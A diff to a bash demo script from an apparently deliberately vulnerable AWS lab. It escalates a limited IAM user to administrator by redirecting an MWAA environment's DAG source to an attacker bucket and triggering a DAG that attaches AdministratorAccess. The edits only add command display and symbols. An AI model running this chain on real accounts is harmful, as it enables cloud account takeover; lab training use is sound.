@@ -6,7 +6,9 @@
 # attacker-controlled bucket containing a malicious DAG that attaches
 # AdministratorAccess to the starting user when triggered
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -15,6 +17,24 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 MAGENTA='\033[0;35m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-mwaa-002-to-admin-starting-user"
@@ -87,7 +107,7 @@ echo "MWAA Environment: $MWAA_ENV_NAME"
 echo "Attacker Bucket: $ATTACKER_BUCKET_NAME"
 echo "Attacker DAG Path: $ATTACKER_DAG_PATH"
 echo "Malicious DAG Name: $MALICIOUS_DAG_NAME"
-echo -e "${GREEN}OK Retrieved configuration from Terraform${NC}\n"
+echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
@@ -102,6 +122,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -109,18 +130,20 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
     echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
     exit 1
 fi
-echo -e "${GREEN}OK Verified starting user identity${NC}\n"
+echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
-echo -e "${GREEN}OK Retrieved account ID${NC}\n"
+echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
 # Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Checking currently attached policies to starting user..."
 
+show_cmd "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyName' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
     --user-name "$STARTING_USER_NAME" \
     --query 'AttachedPolicies[*].PolicyName' \
@@ -134,10 +157,11 @@ fi
 
 echo ""
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
-    echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
+    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
-    echo -e "${GREEN}OK Confirmed: Cannot list IAM users (as expected)${NC}"
+    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
 fi
 echo ""
 
@@ -146,6 +170,7 @@ echo -e "${YELLOW}Step 5: Checking current MWAA environment status${NC}"
 echo "Environment: $MWAA_ENV_NAME"
 echo ""
 
+show_cmd "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --output json"
 ENV_INFO=$(aws mwaa get-environment \
     --region "$AWS_REGION" \
     --name "$MWAA_ENV_NAME" \
@@ -164,7 +189,7 @@ if [ "$CURRENT_STATUS" != "AVAILABLE" ]; then
     echo "Please wait for the environment to be available before running this demo."
     exit 1
 fi
-echo -e "${GREEN}OK Environment is AVAILABLE${NC}\n"
+echo -e "${GREEN}✓ Environment is AVAILABLE${NC}\n"
 
 # Step 6: Update MWAA environment with attacker's DAG bucket
 echo -e "${YELLOW}Step 6: Updating MWAA environment with attacker's DAG bucket${NC}"
@@ -181,6 +206,7 @@ echo ""
 
 echo "Calling airflow:UpdateEnvironment to change DAG source..."
 
+show_attack_cmd "aws mwaa update-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --source-bucket-arn \"arn:aws:s3:::$ATTACKER_BUCKET_NAME\" --dag-s3-path \"$ATTACKER_DAG_PATH\""
 aws mwaa update-environment \
     --region "$AWS_REGION" \
     --name "$MWAA_ENV_NAME" \
@@ -188,7 +214,7 @@ aws mwaa update-environment \
     --dag-s3-path "$ATTACKER_DAG_PATH" > /dev/null
 
 if [ $? -eq 0 ]; then
-    echo -e "${GREEN}OK Successfully initiated MWAA environment update!${NC}"
+    echo -e "${GREEN}✓ Successfully initiated MWAA environment update!${NC}"
 else
     echo -e "${RED}Error: Failed to update MWAA environment${NC}"
     exit 1
@@ -207,6 +233,7 @@ ELAPSED=0
 CHECK_INTERVAL=60  # Check every minute
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
+    show_cmd "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --query 'Environment.Status' --output text"
     STATUS=$(aws mwaa get-environment \
         --region "$AWS_REGION" \
         --name "$MWAA_ENV_NAME" \
@@ -226,13 +253,13 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
 
         if [[ "$UPDATED_BUCKET" == *"$ATTACKER_BUCKET_NAME"* ]]; then
             echo ""
-            echo -e "${GREEN}OK MWAA environment update complete!${NC}"
+            echo -e "${GREEN}✓ MWAA environment update complete!${NC}"
             echo "New source bucket: $UPDATED_BUCKET"
             break
         fi
     elif [ "$STATUS" = "UPDATE_FAILED" ]; then
         echo ""
-        echo -e "${RED}X MWAA environment update failed!${NC}"
+        echo -e "${RED}✗ MWAA environment update failed!${NC}"
         echo "Fetching error details..."
         aws mwaa get-environment \
             --region "$AWS_REGION" \
@@ -249,7 +276,7 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
 done
 
 if [ $ELAPSED -ge $MAX_WAIT ]; then
-    echo -e "${RED}X Timeout: Environment did not become available within expected time${NC}"
+    echo -e "${RED}✗ Timeout: Environment did not become available within expected time${NC}"
     echo -e "${RED}The update may still be in progress. Check the AWS console.${NC}"
     echo -e "${RED}Please run cleanup_attack.sh to clean up if needed${NC}"
     exit 1
@@ -260,7 +287,7 @@ echo ""
 echo -e "${YELLOW}Step 8: Waiting for DAGs to sync (60 seconds)${NC}"
 echo "MWAA needs time to discover and parse the new DAGs from the attacker bucket..."
 sleep 60
-echo -e "${GREEN}OK DAG sync wait complete${NC}\n"
+echo -e "${GREEN}✓ DAG sync wait complete${NC}\n"
 
 # Step 9: Trigger the malicious DAG
 echo -e "${YELLOW}Step 9: Triggering the malicious DAG${NC}"
@@ -311,27 +338,28 @@ if [[ "$TRIGGER_RESPONSE" == *"error"* ]] || [[ "$TRIGGER_RESPONSE" == *"not fou
     echo "Retry response: $TRIGGER_RESPONSE"
 fi
 
-echo -e "${GREEN}OK DAG trigger request sent${NC}\n"
+echo -e "${GREEN}✓ DAG trigger request sent${NC}\n"
 
 # Step 10: Wait for DAG execution and IAM propagation
 echo -e "${YELLOW}Step 10: Waiting for DAG execution and IAM policy propagation${NC}"
 echo "The DAG runs with admin execution role credentials and attaches AdministratorAccess..."
 echo "Waiting 30 seconds for DAG execution and IAM changes to propagate..."
 sleep 30
-echo -e "${GREEN}OK Wait complete${NC}\n"
+echo -e "${GREEN}✓ Wait complete${NC}\n"
 
 # Step 11: Verify admin access
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Checking if AdministratorAccess is now attached to starting user..."
 
 # Check attached policies
+show_cmd "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyArn' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
     --user-name "$STARTING_USER_NAME" \
     --query 'AttachedPolicies[*].PolicyArn' \
     --output text 2>/dev/null || echo "")
 
 if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
-    echo -e "${GREEN}OK AdministratorAccess policy is attached to $STARTING_USER_NAME!${NC}"
+    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER_NAME!${NC}"
 else
     echo -e "${YELLOW}Note: AdministratorAccess not yet visible. Checking again after waiting...${NC}"
     sleep 15
@@ -342,16 +370,17 @@ else
         --output text 2>/dev/null || echo "")
 
     if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
-        echo -e "${GREEN}OK AdministratorAccess policy is attached to $STARTING_USER_NAME!${NC}"
+        echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER_NAME!${NC}"
     fi
 fi
 
 echo ""
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
-    echo -e "${GREEN}OK Successfully listed IAM users!${NC}"
-    echo -e "${GREEN}OK ADMIN ACCESS CONFIRMED${NC}"
+    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
+    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
     echo -e "${YELLOW}Note: May need to wait longer for IAM propagation${NC}"
     echo "The DAG should have attached AdministratorAccess to $STARTING_USER_NAME"
@@ -360,7 +389,7 @@ echo ""
 
 # Summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER_NAME (limited permissions)"
@@ -372,11 +401,18 @@ echo "6. DAG attached AdministratorAccess to starting user"
 echo "7. Achieved: Administrator Access"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER_NAME -> (airflow:UpdateEnvironment)"
-echo -e "  -> Changed DAG source to attacker's bucket"
-echo -e "  -> (airflow:CreateCliToken) -> Triggered malicious DAG"
-echo -e "  -> (DAG execution with $ADMIN_ROLE credentials)"
-echo -e "  -> (iam:AttachUserPolicy) -> Admin Access"
+echo -e "  $STARTING_USER_NAME → (airflow:UpdateEnvironment)"
+echo -e "  → Changed DAG source to attacker's bucket"
+echo -e "  → (airflow:CreateCliToken) → Triggered malicious DAG"
+echo -e "  → (DAG execution with $ADMIN_ROLE credentials)"
+echo -e "  → (iam:AttachUserPolicy) → Admin Access"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Key Difference from mwaa-001:${NC}"
 echo "  - mwaa-001: Creates a NEW environment with PassRole"
